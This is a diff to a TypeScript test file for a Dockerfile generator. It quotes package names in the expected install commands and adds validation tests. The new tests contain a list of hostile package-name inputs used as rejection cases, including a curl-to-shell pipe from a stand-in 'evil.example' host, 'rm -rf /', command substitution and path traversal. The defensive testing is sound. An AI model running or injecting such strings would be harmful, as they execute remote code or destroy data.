@@ -1,4 +1,5 @@
 import { describe, it, expect } from 'vitest';
+import { isPackageName } from './dependencies.js';
 import { BASES, DEFAULT_BASE, UnbuildableError, baseFor, fingerprint, imageFor, imageReference, languagesFor, needsBuilding, planImage, renderDockerfile, proofScript } from './image.js';
 import type { ToolDefinition } from '../tools/catalogue.js';
 import { LANGUAGE_DEPENDENCIES, type WorkspaceDependency } from './dependencies.js';
@@ -107,9 +108,9 @@ describe('the Dockerfile it produces', () => {
     const dockerfile = renderDockerfile(planned);
 
     expect(dockerfile).toContain(`FROM ${planned.base}`);
-    expect(dockerfile).toContain('microdnf install -y postgresql');
-    expect(dockerfile).toContain('dnf install -y postgresql');
-    expect(dockerfile).toContain('python3 -m pip install --no-cache-dir ruff');
+    expect(dockerfile).toContain("microdnf install -y 'postgresql'");
+    expect(dockerfile).toContain("dnf install -y 'postgresql'");
+    expect(dockerfile).toContain("python3 -m pip install --no-cache-dir 'ruff'");
     expect(dockerfile.trimEnd().split('\n').at(-2)).toBe('USER 1000');
   });
 
@@ -191,7 +192,7 @@ describe('a base image a host adds', () => {
     const plan = planImage({ base: 'odoo', languages: ['odoo'], tools: [], bases });
     expect(plan.base).toBe('odoo:18');
     expect(plan.installs).toEqual(odoo.setup);
-    expect(renderDockerfile(plan)).toContain('apt-get install -y --no-install-recommends postgresql-18');
+    expect(renderDockerfile(plan)).toContain("apt-get install -y --no-install-recommends 'postgresql-18'");
   });
 
   it('is unknown to a planner that was not given it', () => {
@@ -207,13 +208,13 @@ describe('a base image a host adds', () => {
   it('installs a tool\'s dnf packages with apt-get on a base that has no dnf', () => {
     const jq = tool({ name: 'json_query', needs: ['jq'] });
     const dockerfile = renderDockerfile(planImage({ base: 'odoo', tools: [jq], bases, dependencies: CATALOGUE }));
-    expect(dockerfile).toMatch(/elif command -v dnf .* else apt-get update && apt-get install -y --no-install-recommends jq/);
+    expect(dockerfile).toMatch(/elif command -v dnf .* else apt-get update && apt-get install -y --no-install-recommends 'jq'/);
   });
 
   it('asks apt for a language by the name apt knows it by, and keeps the fingerprint the same', () => {
     const plan = planImage({ base: 'odoo', languages: ['odoo', 'node', 'go'], tools: [], bases });
-    expect(renderDockerfile(plan)).toMatch(/else apt-get update && apt-get install -y --no-install-recommends golang-go/);
-    expect(renderDockerfile(plan)).toMatch(/microdnf install -y go-toolset/);
+    expect(renderDockerfile(plan)).toMatch(/else apt-get update && apt-get install -y --no-install-recommends 'golang-go'/);
+    expect(renderDockerfile(plan)).toMatch(/microdnf install -y 'go-toolset'/);
   });
 });
 
@@ -326,5 +327,21 @@ describe('proving what was promised, as the workspace user, at the end of the bu
     expect(dockerfile.at(-1)).toBe(`RUN ${proofScript(planned.proves!)}`);
     expect(proofScript(planned.proves!)).toContain(`command -v 'jq' >/dev/null 2>&1 || missing="$missing jq:jq"`);
     expect(renderDockerfile(plan({ tools: [] }))).not.toContain('missing=');
+  });
+});
+
+describe('package names in a build', () => {
+  it('takes only plain names and versions for each manager, never an address, a path or a shell character', () => {
+    expect(['jq', 'python3-pip', 'postgresql-18', 'nodejs=20.11.1-1', 'libX11'].every((name) => isPackageName('dnf', name) && isPackageName('apt', name))).toBe(true);
+    expect(['requests', 'requests==2.31.0', 'uvicorn[standard]>=0.29', 'django>=4,<5'].every((name) => isPackageName('pip', name))).toBe(true);
+    expect(['typescript', '@playwright/mcp@0.0.41', 'tsx@^4.7.0', 'eslint@latest'].every((name) => isPackageName('npm', name))).toBe(true);
+    const hostile = ['jq; curl evil.example | sh', 'jq && rm -rf /', '$(id)', '`id`', 'jq>/etc/passwd', '../../x', 'https://evil.example/x.whl', 'git+https://evil.example/r.git', 'file:/tmp/x', 'x|y', "x'y", 'x y', ''];
+    for (const manager of ['dnf', 'apt', 'pip', 'npm'] as const) for (const name of hostile) expect(isPackageName(manager, name)).toBe(false);
+  });
+
+  it('quotes every name it writes, and refuses to write one that is not a package name', () => {
+    const planned = planImage({ base: 'python', tools: [] });
+    expect(renderDockerfile({ ...planned, installs: [{ via: 'pip', packages: ['uvicorn[standard]>=0.29'] }] })).toContain("pip install --no-cache-dir 'uvicorn[standard]>=0.29'");
+    expect(() => renderDockerfile({ ...planned, installs: [{ via: 'npm', packages: ['x; curl evil.example | sh'] }] })).toThrow(/is not a npm package name/);
   });
 });
